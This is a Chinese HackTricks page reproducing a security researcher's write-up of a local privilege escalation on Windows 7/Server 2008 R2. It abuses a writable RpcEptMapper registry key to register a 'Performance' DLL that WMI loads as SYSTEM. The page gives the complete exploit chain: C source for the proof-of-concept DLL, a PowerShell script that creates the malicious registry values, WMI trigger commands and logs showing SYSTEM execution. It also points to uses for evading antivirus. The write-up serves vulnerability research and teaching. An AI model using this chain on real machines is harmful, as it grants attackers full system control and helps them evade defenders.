<details>

<summary><strong>零基础学习AWS黑客技术成为高手</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF版本**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>


**信息复制自** [**https://itm4n.github.io/windows-registry-rpceptmapper-eop/**](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)

根据脚本的输出，当前用户在两个注册表键上拥有一些写权限：

* `HKLM\SYSTEM\CurrentControlSet\Services\Dnscache`
* `HKLM\SYSTEM\CurrentControlSet\Services\RpcEptMapper`

让我们使用`regedit` GUI手动检查`RpcEptMapper`服务的权限。我真正喜欢的_高级安全设置_窗口中的一个功能是_有效权限_标签页。您可以选择任何用户或组名，并立即查看授予该主体的有效权限，无需单独检查所有ACE。以下截图显示了低权限的`lab-user`账户的结果。

![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/02\_regsitry-rpceptmapper-permissions.png)

大多数权限是标准的（例如：`Query Value`），但有一个特别突出的权限：`Create Subkey`。对应于此权限的通用名称是`AppendData/AddSubdirectory`，这正是脚本报告的内容：
```
Name              : RpcEptMapper
ImagePath         : C:\Windows\system32\svchost.exe -k RPCSS
User              : NT AUTHORITY\NetworkService
ModifiablePath    : {Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\RpcEptMapper}
IdentityReference : NT AUTHORITY\Authenticated Users
Permissions       : {ReadControl, AppendData/AddSubdirectory, ReadData/ListDirectory}
Status            : Running
UserCanStart      : True
UserCanRestart    : False

Name              : RpcEptMapper
ImagePath         : C:\Windows\system32\svchost.exe -k RPCSS
User              : NT AUTHORITY\NetworkService
ModifiablePath    : {Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\RpcEptMapper}
IdentityReference : BUILTIN\Users
Permissions       : {WriteExtendedAttributes, AppendData/AddSubdirectory, ReadData/ListDirectory}
Status            : Running
UserCanStart      : True
UserCanRestart    : False
```
这到底意味着什么？这意味着我们不能仅仅修改`ImagePath`值。要做到这一点，我们需要`WriteData/AddFile`权限。相反，我们只能创建一个新的子键。

![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/03\_registry-imagepath-access-denied.png)

这是否意味着这确实是一个误报？当然不是。让乐趣开始吧！

## RTFM <a href="#rtfm" id="rtfm"></a>

此时，我们知道我们可以在`HKLM\SYSTEM\CurrentControlSet\Services\RpcEptMapper`下创建任意子键，但我们不能修改现有的子键和值。这些已经存在的子键是`Parameters`和`Security`，这对于Windows服务来说是相当常见的。

![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/04\_registry-rpceptmapper-config.png)

因此，我脑海中出现的第一个问题是：_是否有任何其他预定义的子键 - 如`Parameters`和`Security` - 我们可以利用它来有效地修改服务的配置并以任何方式改变其行为？_

为了回答这个问题，我的初步计划是枚举所有现有的键，并尝试识别一个模式。想法是看看哪些子键对于服务的配置是_有意义的_。我开始考虑如何在PowerShell中实现这一点，然后对结果进行排序。不过，在这样做之前，我想知道这个注册表结构是否已经有文档记录。所以，我谷歌了类似`windows service configuration registry site:microsoft.com`的内容，这是我得到的第一个[结果](https://docs.microsoft.com/en-us/windows-hardware/drivers/install/hklm-system-currentcontrolset-services-registry-tree)。

![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/05\_google-search-registry-services.png)

看起来很有希望，不是吗？乍一看，文档似乎不是很全面和完整。考虑到标题，我期望看到某种树状结构详细描述定义服务配置的所有子键和值，但显然并没有。

![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/06\_doc-registry-services.png)

尽管如此，我还是快速浏览了每个段落。很快，我就发现了关键词“_**Performance**_”和“_**DLL**_”。在“**Performance**”的小标题下，我们可以读到以下内容：

> **Performance**：_一个指定可选性能监控信息的键。此键下的值指定**驱动程序性能DLL的名称**和**该DLL中某些导出函数的名称**。您可以使用驱动程序的INF文件中的AddReg条目向此子键添加值条目。_

根据这段简短的段落，理论上可以在驱动服务中注册一个DLL，以便借助`Performance`子键监控其性能。**好的，这真的很有趣！**对于`RpcEptMapper`服务来说，这个键默认是不存在的，看起来正是我们需要的。不过有一个小问题，这个服务绝对不是一个驱动服务。无论如何，这仍然值得一试，但我们首先需要更多关于这个“_性能监控_”功能的信息。

![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/07\_sc-qc-rpceptmapper.png)

> **注意：**在Windows中，每个服务都有一个给定的`Type`。服务类型可以是以下值之一：`SERVICE_KERNEL_DRIVER (1)`，`SERVICE_FILE_SYSTEM_DRIVER (2)`，`SERVICE_ADAPTER (4)`，`SERVICE_RECOGNIZER_DRIVER (8)`，`SERVICE_WIN32_OWN_PROCESS (16)`，`SERVICE_WIN32_SHARE_PROCESS (32)`或`SERVICE_INTERACTIVE_PROCESS (256)`。

经过一些谷歌搜索，我在文档中找到了这个资源：[创建应用程序的性能键](https://docs.microsoft.com/en-us/windows/win32/perfctrs/creating-the-applications-performance-key)。

![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/08\_performance-subkey-documentation.png)

首先，有一个很好的树状结构列出了我们必须创建的所有键和值。然后，描述提供了以下关键信息：

* `Library`值可以包含**一个DLL名称或一个DLL的完整路径**。
* `Open`、`Collect`和`Close`值允许您指定**应该由DLL导出的函数名称**。
* 这些值的数据类型是`REG_SZ`（甚至对于`Library`值也可以是`REG_EXPAND_SZ`）。

如果你跟随这个资源中包含的链接，你甚至会找到这些函数的原型以及一些代码示例：[实现OpenPerformanceData](https://docs.microsoft.com/en-us/windows/win32/perfctrs/implementing-openperformancedata)。
```
DWORD APIENTRY OpenPerfData(LPWSTR pContext);
DWORD APIENTRY CollectPerfData(LPWSTR pQuery, PVOID* ppData, LPDWORD pcbData, LPDWORD pObjectsReturned);
DWORD APIENTRY ClosePerfData();
```
## 编写概念验证 <a href="#writing-a-proof-of-concept" id="writing-a-proof-of-concept"></a>

感谢我能够从文档中收集到的所有信息，编写一个简单的概念验证 DLL 应该相当直接。但我们仍然需要一个计划！

当我需要利用某种 DLL 劫持漏洞时，我通常会从一个简单的自定义日志辅助函数开始。这个函数的目的是在每次调用时将一些关键信息写入文件。通常，我会记录当前进程和父进程的 PID，运行进程的用户名称及其对应的命令行。我还会记录触发此日志事件的函数名称。这样，我就知道哪部分代码被执行了。

在我的其他文章中，我总是跳过开发部分，因为我假设这或多或少是显而易见的。但是，我也希望我的博客文章对初学者友好，所以这里有一个矛盾。我将在这里通过详细介绍过程来解决这个情况。那么，让我们启动 Visual Studio 并创建一个新的“_C++ 控制台应用程序_”项目。请注意，我本可以创建一个“_动态链接库 (DLL)_”项目，但我发现实际上从控制台应用程序开始更容易。

以下是 Visual Studio 生成的初始代码：
```c
#include <iostream>

int main()
{
std::cout << "Hello World!\n";
}
```
当然，这不是我们想要的。我们想要创建一个DLL，而不是EXE，所以我们必须用`DllMain`函数替换`main`函数。你可以在文档中找到这个函数的框架代码：[初始化一个DLL](https://docs.microsoft.com/en-us/cpp/build/run-time-library-behavior#initialize-a-dll)。
```c
#include <Windows.h>

extern "C" BOOL WINAPI DllMain(HINSTANCE const instance, DWORD const reason, LPVOID const reserved)
{
switch (reason)
{
case DLL_PROCESS_ATTACH:
Log(L"DllMain"); // See log helper function below
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
case DLL_PROCESS_DETACH:
break;
}
return TRUE;
}
```
```markdown
同时，我们还需要更改项目设置，以指定输出编译文件应该是DLL而不是EXE。为此，您可以打开项目属性，在“**常规**”部分，选择“**动态库(.dll)**”作为“**配置类型**”。在标题栏下方，您还可以选择“**所有配置**”和“**所有平台**”，以便全局应用此设置。

接下来，我添加了我的自定义日志辅助函数。
```
```c
#include <Lmcons.h> // UNLEN + GetUserName
#include <tlhelp32.h> // CreateToolhelp32Snapshot()
#include <strsafe.h>

void Log(LPCWSTR pwszCallingFrom)
{
LPWSTR pwszBuffer, pwszCommandLine;
WCHAR wszUsername[UNLEN + 1] = { 0 };
SYSTEMTIME st = { 0 };
HANDLE hToolhelpSnapshot;
PROCESSENTRY32 stProcessEntry = { 0 };
DWORD dwPcbBuffer = UNLEN, dwBytesWritten = 0, dwProcessId = 0, dwParentProcessId = 0, dwBufSize = 0;
BOOL bResult = FALSE;

// Get the command line of the current process
pwszCommandLine = GetCommandLine();

// Get the name of the process owner
GetUserName(wszUsername, &dwPcbBuffer);

// Get the PID of the current process
dwProcessId = GetCurrentProcessId();

// Get the PID of the parent process
hToolhelpSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
stProcessEntry.dwSize = sizeof(PROCESSENTRY32);
if (Process32First(hToolhelpSnapshot, &stProcessEntry)) {
do {
if (stProcessEntry.th32ProcessID == dwProcessId) {
dwParentProcessId = stProcessEntry.th32ParentProcessID;
break;
}
} while (Process32Next(hToolhelpSnapshot, &stProcessEntry));
}
CloseHandle(hToolhelpSnapshot);

// Get the current date and time
GetLocalTime(&st);

// Prepare the output string and log the result
dwBufSize = 4096 * sizeof(WCHAR);
pwszBuffer = (LPWSTR)malloc(dwBufSize);
if (pwszBuffer)
{
StringCchPrintf(pwszBuffer, dwBufSize, L"[%.2u:%.2u:%.2u] - PID=%d - PPID=%d - USER='%s' - CMD='%s' - METHOD='%s'\r\n",
st.wHour,
st.wMinute,
st.wSecond,
dwProcessId,
dwParentProcessId,
wszUsername,
pwszCommandLine,
pwszCallingFrom
);

LogToFile(L"C:\\LOGS\\RpcEptMapperPoc.log", pwszBuffer);

free(pwszBuffer);
}
}
```
然后，我们可以用文档中看到的三个函数填充DLL。文档还指出，如果成功，它们应该返回`ERROR_SUCCESS`。
```c
DWORD APIENTRY OpenPerfData(LPWSTR pContext)
{
Log(L"OpenPerfData");
return ERROR_SUCCESS;
}

DWORD APIENTRY CollectPerfData(LPWSTR pQuery, PVOID* ppData, LPDWORD pcbData, LPDWORD pObjectsReturned)
{
Log(L"CollectPerfData");
return ERROR_SUCCESS;
}

DWORD APIENTRY ClosePerfData()
{
Log(L"ClosePerfData");
return ERROR_SUCCESS;
}
```
项目现在已正确配置，`DllMain` 已实现，我们有一个日志帮助函数和三个必需的函数。不过，还缺少最后一件事。如果我们编译这段代码，`OpenPerfData`、`CollectPerfData` 和 `ClosePerfData` 将只作为内部函数可用，因此我们需要将它们**导出**。这可以通过几种方式实现。例如，您可以创建一个 [DEF](https://docs.microsoft.com/en-us/cpp/build/exporting-from-a-dll-using-def-files) 文件，然后相应地配置项目。然而，我更喜欢使用 `__declspec(dllexport)` 关键字（[文档](https://docs.microsoft.com/en-us/cpp/build/exporting-from-a-dll-using-declspec-dllexport)），特别是对于像这样的小项目。这样，我们只需在源代码开头声明这三个函数。
```c
extern "C" __declspec(dllexport) DWORD APIENTRY OpenPerfData(LPWSTR pContext);
extern "C" __declspec(dllexport) DWORD APIENTRY CollectPerfData(LPWSTR pQuery, PVOID* ppData, LPDWORD pcbData, LPDWORD pObjectsReturned);
extern "C" __declspec(dllexport) DWORD APIENTRY ClosePerfData();
```
如果您想查看完整代码，我已将其上传[此处](https://gist.github.com/itm4n/253c5937f9b3408b390d51ac068a4d12)。

最后，我们可以选择 _**Release/x64**_ 并“_**构建解决方案**_”。这将生成我们的DLL文件：`.\DllRpcEndpointMapperPoc\x64\Release\DllRpcEndpointMapperPoc.dll`。

## 测试 PoC <a href="#testing-the-poc" id="testing-the-poc"></a>

在进一步操作之前，我总是确保我的有效载荷能够通过单独测试正常工作。在这里花费的一点时间可以通过防止您在假设的调试阶段进入死胡同而节省大量时间。为此，我们可以简单地使用 `rundll32.exe` 并传递DLL的名称和导出函数的名称作为参数。
```
C:\Users\lab-user\Downloads\>rundll32 DllRpcEndpointMapperPoc.dll,OpenPerfData
```
很好，日志文件已创建，如果我们打开它，我们可以看到两条记录。第一条是当DLL被`rundll32.exe`加载时写入的。第二条是在调用`OpenPerfData`时写入的。看起来不错！![:slightly_smiling_face:](https://github.githubassets.com/images/icons/emoji/unicode/1f642.png)
```
[21:25:34] - PID=3040 - PPID=2964 - USER='lab-user' - CMD='rundll32  DllRpcEndpointMapperPoc.dll,OpenPerfData' - METHOD='DllMain'
[21:25:34] - PID=3040 - PPID=2964 - USER='lab-user' - CMD='rundll32  DllRpcEndpointMapperPoc.dll,OpenPerfData' - METHOD='OpenPerfData'
```
现在，我们可以关注实际的漏洞，并开始创建所需的注册表键和值。我们可以手动使用 `reg.exe` / `regedit.exe` 来完成，或者用脚本以编程方式进行。由于我在最初的研究中已经手动执行了这些步骤，我将展示用PowerShell脚本更干净的方式来做同样的事情。此外，在PowerShell中创建注册表键和值就像调用 `New-Item` 和 `New-ItemProperty` 一样简单，不是吗？ ![:thinking:](https://github.githubassets.com/images/icons/emoji/unicode/1f914.png)

![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/10\_powershell-new-item-access-denied.png)

`请求的注册表访问不被允许`… 嗯，好吧… 看起来毕竟不会那么容易。 ![:stuck\_out\_tongue:](https://github.githubassets.com/images/icons/emoji/unicode/1f61b.png)

我没有真正调查这个问题，但我的猜测是，当我们调用 `New-Item` 时，`powershell.exe` 实际上尝试以对应于我们没有的权限的某些标志来打开父注册表键。

无论如何，如果内置的cmdlet不能完成工作，我们总是可以下降一个层级，直接调用DotNet函数。实际上，注册表键也可以用以下PowerShell代码创建。
```
[Microsoft.Win32.Registry]::LocalMachine.CreateSubKey("SYSTEM\CurrentControlSet\Services\RpcEptMapper\Performance")
```
```markdown
![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/11_powershell-dotnet-createsubkey.png)

我们开始吧！最后，我编写了以下脚本，以创建适当的键和值，等待用户输入，最后通过清理所有内容来结束。
```
```
$ServiceKey = "SYSTEM\CurrentControlSet\Services\RpcEptMapper\Performance"

Write-Host "[*] Create 'Performance' subkey"
[void] [Microsoft.Win32.Registry]::LocalMachine.CreateSubKey($ServiceKey)
Write-Host "[*] Create 'Library' value"
New-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Library" -Value "$($pwd)\DllRpcEndpointMapperPoc.dll" -PropertyType "String" -Force | Out-Null
Write-Host "[*] Create 'Open' value"
New-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Open" -Value "OpenPerfData" -PropertyType "String" -Force | Out-Null
Write-Host "[*] Create 'Collect' value"
New-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Collect" -Value "CollectPerfData" -PropertyType "String" -Force | Out-Null
Write-Host "[*] Create 'Close' value"
New-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Close" -Value "ClosePerfData" -PropertyType "String" -Force | Out-Null

Read-Host -Prompt "Press any key to continue"

Write-Host "[*] Cleanup"
Remove-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Library" -Force
Remove-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Open" -Force
Remove-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Collect" -Force
Remove-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Close" -Force
[Microsoft.Win32.Registry]::LocalMachine.DeleteSubKey($ServiceKey)
```
最后一步，**我们如何诱使 RPC Endpoint Mapper 服务加载我们的 Performace DLL？** 遗憾的是，我没有记录下我尝试过的所有不同方法。在这篇博客文章的背景下，强调研究有时可能是多么乏味和耗时是非常有趣的。无论如何，我在途中发现的一件事是，你可以使用 WMI（_Windows Management Instrumentation_）查询 _性能计数器_，毕竟这并不太令人惊讶。更多信息在这里：[_WMI 性能计数器类型_](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-performance-counter-types)。

> _计数器类型作为_ [_Win32\_PerfRawData_](https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-perfrawdata) _类中属性的 CounterType 限定符，以及_ [_Win32\_PerfFormattedData_](https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-perfformatteddata) _类中属性的 CookingType 限定符出现。_

因此，我首先使用以下命令在 PowerShell 中枚举与 _性能数据_ 相关的 WMI 类。
```
Get-WmiObject -List | Where-Object { $_.Name -Like "Win32_Perf*" }
```
![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/12_powershell-get-wmiobject.gif)

然后，我看到我的日志文件几乎立刻就被创建了！以下是文件的内容。
```
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='DllMain'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='OpenPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
```
我原本以为最多只能以`NETWORK SERVICE`的身份在`RpcEptMapper`服务的上下文中执行任意代码，但结果比预期的要好得多。我实际上在`WMI`服务本身的上下文中获得了任意代码执行权限，而该服务是以`LOCAL SYSTEM`身份运行的。这有多棒？！ ![:sunglasses:](https://github.githubassets.com/images/icons/emoji/unicode/1f60e.png)

> **注意：**如果我获得了作为`NETWORK SERVICE`的任意代码执行权限，那么多亏了几个月前James Forshaw在这篇博客文章中展示的技巧，我离`LOCAL SYSTEM`账户只有一个令牌的距离：[Sharing a Logon Session a Little Too Much](https://www.tiraniddo.dev/2020/04/sharing-logon-session-little-too-much.html)。

我还尝试分别获取每个WMI类，并观察到了完全相同的结果。
```
Get-WmiObject Win32_Perf
Get-WmiObject Win32_PerfRawData
Get-WmiObject Win32_PerfFormattedData
```
## 结论 <a href="#conclusion" id="conclusion"></a>

我不知道这个漏洞为何如此长时间未被注意到。一个解释是其他工具可能在寻找注册表中的完全写入权限，而实际上在这种情况下`AppendData/AddSubdirectory`权限已经足够了。关于“配置错误”本身，我假设注册表键是为了特定目的而设置的，尽管我想不出具体的场景，用户会有任何权限修改服务的配置。

我决定公开写关于这个漏洞的文章有两个原因。第一个是我实际上在几个月前更新我的PrivescCheck脚本时，加入了`GetModfiableRegistryPath`函数，那时我无意中公开了它。第二个原因是影响较小。它需要本地访问权限，并且只影响不再受支持的旧版本Windows（除非你购买了扩展支持...）。此时，如果你仍在使用Windows 7 / Server 2008 R2而没有先在网络中适当隔离这些机器，那么防止攻击者获得SYSTEM权限可能是你最不需要担心的问题。

除了这个特权提升漏洞的轶事之外，我认为这个“性能”注册表设置为后期利用、横向移动和AV/EDR规避打开了非常有趣的机会。我已经想到了一些特定的场景，但我还没有测试它们。未完待续？…


<details>

<summary><strong>从零开始学习AWS黑客攻击直到成为专家，通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果你想在**HackTricks**中看到你的**公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享你的黑客技巧。

</details>
